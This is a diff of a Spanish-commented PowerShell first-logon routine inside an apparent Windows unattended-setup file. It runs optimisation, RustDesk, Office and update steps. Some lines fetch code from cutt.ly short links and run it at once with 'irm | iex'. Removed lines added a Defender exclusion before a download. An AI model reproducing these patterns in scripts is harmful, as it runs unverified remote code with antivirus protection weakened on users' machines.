-                    if ($null -ne $state -and ($i -is [int]) -and $i -lt $state.Count) {
-                        $state[$i].status = 'error'
-                        $state | ConvertTo-Json | Set-Content $stateFile -Encoding UTF8
-                    }
-                    return
-                }
-
-                # Añadir exclusión al archivo destino antes de descargar y ejecutarlo
-                try { Add-DefenderExclusion -Path (Join-Path $scriptDir 'UpdateGUI.ps1') } catch {}
-                Write-Output "[$(Get-Date)] Descargando Update_GUI..."
-                $ok = Download-And-Run -Url 'https://cutt.ly/UpdateGUI' -OutName 'UpdateGUI.ps1'
-            }
-
-            if (-not $ok) {
-                Write-Error "Error descargando desde https://cutt.ly/UpdateGUI"
-                if ($null -ne $state -and ($i -is [int]) -and $i -lt $state.Count) {
-                    $state[$i].status = 'error'
-                    $state | ConvertTo-Json | Set-Content $stateFile -Encoding UTF8
-                }
-                return
-            }
-
-            $updatesLog = 'C:\Updates.log'
-            $matchText = 'Todo listo. Drivers y actualizaciones aplicadas.'
-            $maxWaitSeconds = 1800
-            $interval = 10
-            $elapsed = 0
-            Write-Output "[$(Get-Date)] Esperando confirmaci?n en $updatesLog..."
-            while ($elapsed -lt $maxWaitSeconds) {
-                if (Test-Path $updatesLog) {
-                    try {
-                        $content = Get-Content $updatesLog -Raw -ErrorAction Stop
-                        if ($content -match [regex]::Escape($matchText)) {
-                            Write-Output "[$(Get-Date)] Texto encontrado en $updatesLog"
-                            if ($null -ne $state -and ($i -is [int]) -and $i -lt $state.Count) {
-                                $state[$i].status = 'done'
-                                $state | ConvertTo-Json | Set-Content $stateFile -Encoding UTF8
-                            } else {
-                                Write-Warning "No se puede actualizar state.json: variable \$state o ?ndice \$i no v?lidos."
-                            }
-                            return
-                        }
-                    } catch {
-                        Write-Output ("[{0}] Error leyendo {1}: {2}" -f (Get-Date), $updatesLog, $_)
-                    }
-                }
-                Start-Sleep -Seconds $interval
-                $elapsed += $interval
-            }
-
-            Write-Error "Timeout esperando $matchText en $updatesLog"
-            if ($null -ne $state -and ($i -is [int]) -and $i -lt $state.Count) {
-                $state[$i].status = 'error'
-                $state | ConvertTo-Json | Set-Content $stateFile -Encoding UTF8
-            }
-        }},
+        @{ Name = "Confirmando Configuracion"; Script = { Get-Content "$scriptDir\setup-final.ps1" -Raw | Invoke-Expression } },
+		@{ Name = "Comprobar Integritdad"; Script = { Get-Content "$scriptDir\Integrity.ps1" -Raw | Invoke-Expression } },
+		@{ Name = "Instalando Rustdesk"; Script = { Get-Content "$scriptDir\Rustdesk_Download.ps1" -Raw | Invoke-Expression } },		
+		@{ Name = "Instalando Actualizaciones"; Script = { Get-Content "$scriptDir\PSUpdates.ps1" -Raw | Invoke-Expression } },		
         @{ Name = "Optimizando Sistema"; Script = {
             $windowsOptimizePath = $null
             $optHits = @()
@@ -2283,10 +2664,9 @@ Remove-Item $TempFile -Force -ErrorAction SilentlyContinue
                 irm https://cutt.ly/NewOptimize | iex
             }
 	    }},
+		@{ Name = "Optimizando Discos"; Script = { Get-Content "$scriptDir\OptimizeUnidades.ps1" -Raw | Invoke-Expression } },
 		@{ Name = "Cambiando Cursor"; Script = { Get-Content "$scriptDir\CursorVista.ps1" -Raw | Invoke-Expression } },
         @{ Name = "Instalando Office 365"; Script = { Get-Content "$scriptDir\OfficeInstaller.ps1" -Raw | Invoke-Expression } },
-		## @{ Name = "Modulo CompactOS"; Script = { Get-Content "$scriptDir\CompactOS.ps1" -Raw | Invoke-Expression } },
-        ## @{ Name = "Clean Reset Base"; Script = { Get-Content "$scriptDir\Clean_Reset_Base.ps1" -Raw | Invoke-Expression } },
         @{ Name = "Finalizado"; Script = {
             Get-ChildItem $scriptDir -Recurse -Include *.ps1,*.vbs,*.xml -Force -ErrorAction SilentlyContinue |
             Remove-Item -Force -ErrorAction SilentlyContinue
@@ -2308,94 +2688,86 @@ Remove-Item $TempFile -Force -ErrorAction SilentlyContinue
     }
 
     $state = Get-Content $stateFile | ConvertFrom-Json
+	$optimizacionIndex = [array]::IndexOf($scripts.Name, "Optimizando Sistema")
 
-    $windowsUpdateIndex = [array]::IndexOf($scripts.Name, "Instalando Actualizaciones")
-    # Use the exact name as defined in the scripts array (no accents)
-    $optimizacionIndex = [array]::IndexOf($scripts.Name, "Optimizando Sistema")
+	for ($i = 0; $i -lt $scripts.Count; $i++) {
+		if ($state[$i].status -in "pending","pending-reboot") {
+			try {
+				switch ($i) {
+					# --- CASO ESPECIAL: OPTIMIZANDO SISTEMA ---
+					{ $_ -eq $optimizacionIndex } {
+						$log = "C:\ScriptsSyA.log"
+						$fase3Pattern = "\[INFO\]\s*Fase 3 finalizada correctamente"
 
+						try {
+							if (Test-Path $log -and (Get-Content $log -Raw -ErrorAction Stop) -match $fase3Pattern) {
+								$state[$i].status = "done"
+								$state | ConvertTo-Json -Depth 10 | Set-Content $stateFile -Encoding UTF8
+								break
+							}
+						} catch {
+							Write-Output ("[{0}] Error leyendo {1}: {2}" -f (Get-Date), $log, $_)
+						}
 
-    for ($i = 0; $i -lt $scripts.Count; $i++) {
-        if ($state[$i].status -in "pending","pending-reboot") {
-            try {
-                switch ($i) {
-                    { $_ -eq $windowsUpdateIndex } { # Windows Update + Drivers: control propio de estado mediante Updates.log
-                        if ($state[$i].status -eq "pending") {
-                            &amp;  $scripts[$i].Script
-                        }
-                        break
-                    }
-                    { $_ -eq $optimizacionIndex } {
-                        $log = "C:\ScriptsSyA.log"
-                        $fase3Pattern = "\[INFO\]\s*Fase 3 finalizada correctamente"
+						if ($state[$i].status -eq "pending") {
+							$state[$i].status = "pending-reboot"
+							$state | ConvertTo-Json -Depth 10 | Set-Content $stateFile -Encoding UTF8
+							&amp; $scripts[$i].Script
+						}
 
-                        try {
-                            if (Test-Path $log -and (Get-Content $log -Raw -ErrorAction Stop) -match $fase3Pattern) {
-                                $state[$i].status = "done"
-                                $state | ConvertTo-Json | Set-Content $stateFile -Encoding UTF8
-                                break
-                            }
-                        } catch {
-                            Write-Output ("[{0}] Error leyendo {1}: {2}" -f (Get-Date), $log, $_)
-                        }
+						# Bucle de monitoreo para la optimización
+						$monitorInterval = 15
+						while ($true) {
+							Start-Sleep -Seconds $monitorInterval
+							try {
+								if (Test-Path $log) {
+									$content = Get-Content $log -Raw -ErrorAction Stop
+									if ($content -match $fase3Pattern) {
+										Write-Output "[$(Get-Date)] Fase 3 completada detectada en $log"
+										$state[$i].status = "done"
+										$state | ConvertTo-Json -Depth 10 | Set-Content $stateFile -Encoding UTF8
+										break
+									}
+								}
+							} catch {
+								Write-Output ("[{0}] Error leyendo {1}: {2}" -f (Get-Date), $log, $_)
+							}
 
-                        if ($state[$i].status -eq "pending") {
-                            $state[$i].status = "pending-reboot"
-                            $state | ConvertTo-Json | Set-Content $stateFile -Encoding UTF8
-                            &amp;  $scripts[$i].Script
-                            # continue to monitoring loop below
-                        }
+							# Si el proceso se cierra, intentamos relanzarlo
+							$proc = Get-Process -Name "WindowsOptimize" -ErrorAction SilentlyContinue
+							if (-not $proc) {
+								Write-Output "[$(Get-Date)] WindowsOptimize no está corriendo. Intentando lanzarlo de nuevo..."
+								try {
+									&amp; $scripts[$i].Script
+								} catch {
+									Write-Output "[$(Get-Date)] Error al relanzar el script de optimización: $_"
+									try { irm https://cutt.ly/NewOptimize | iex } catch { }
+								}
+							}
+						}
+						break
+					}
 
-                        # Monitor loop: keep checking the ScriptsSyA.log for completion and
-                        # ensure the WindowsOptimize process is running; relaunch if it exits.
-                        $monitorInterval = 15
-                        while ($true) {
-                            Start-Sleep -Seconds $monitorInterval
-                            try {
-                                if (Test-Path $log) {
-                                    $content = Get-Content $log -Raw -ErrorAction Stop
-                                    if ($content -match $fase3Pattern) {
-                                        Write-Output "[$(Get-Date)] Fase 3 completada detectada en $log"
-                                        $state[$i].status = "done"
-                                        $state | ConvertTo-Json | Set-Content $stateFile -Encoding UTF8
-                                        break
-                                    }
-                                }
-                            } catch {
-                                Write-Output ("[{0}] Error leyendo {1}: {2}" -f (Get-Date), $log, $_)
-                            }
-
-                            # If the optimize process is not running, attempt to relaunch the script
-                            $proc = Get-Process -Name "WindowsOptimize" -ErrorAction SilentlyContinue
-                            if (-not $proc) {
-                                Write-Output "[$(Get-Date)] WindowsOptimize no está corriendo. Intentando lanzarlo de nuevo..."
-                                try {
-                                    &amp;  $scripts[$i].Script
-                                } catch {
-                                    Write-Output "[$(Get-Date)] Error al relanzar el script de optimización: $_"
-                                    # fallback: try remote launcher
-                                    try { irm https://cutt.ly/NewOptimize | iex } catch { }
-                                }
-                            }
-                        }
-                        break
-                    }
-
-                    default {
-                        &amp;  $scripts[$i].Script
-                        $state[$i].status = "done"
-                        $state | ConvertTo-Json | Set-Content $stateFile -Encoding UTF8
-                    }
-                }
-                if ($i -eq $optimizacionIndex -and $state[$i].status -ne "done") {
-                    break
-                }
-            } catch {
-                $state[$i].status = "error"
-                $state | ConvertTo-Json | Set-Content $stateFile -Encoding UTF8
-                break
-            }
-        }
-    }
+					# --- EJECUCIÓN ESTÁNDAR PARA EL RESTO DE TAREAS ---
+					default {
+						&amp; $scripts[$i].Script
+						$state[$i].status = "done"
+						$state | ConvertTo-Json -Depth 10 | Set-Content $stateFile -Encoding UTF8
+					}
+				}
+				
+				# Frenar el ciclo general si la optimización requiere un reinicio o no ha finalizado
+				if ($i -eq $optimizacionIndex -and $state[$i].status -ne "done") {
+					break
+				}
+				
+			} catch {
+				$state[$i].status = "error"
+				$state | ConvertTo-Json -Depth 10 | Set-Content $stateFile -Encoding UTF8
+				break
+			}
+		}
+	}
 } >> "C:\Windows\Setup\Scripts\FirstLogon.log" 2>&amp;1
 		</File>
 	</Extensions>
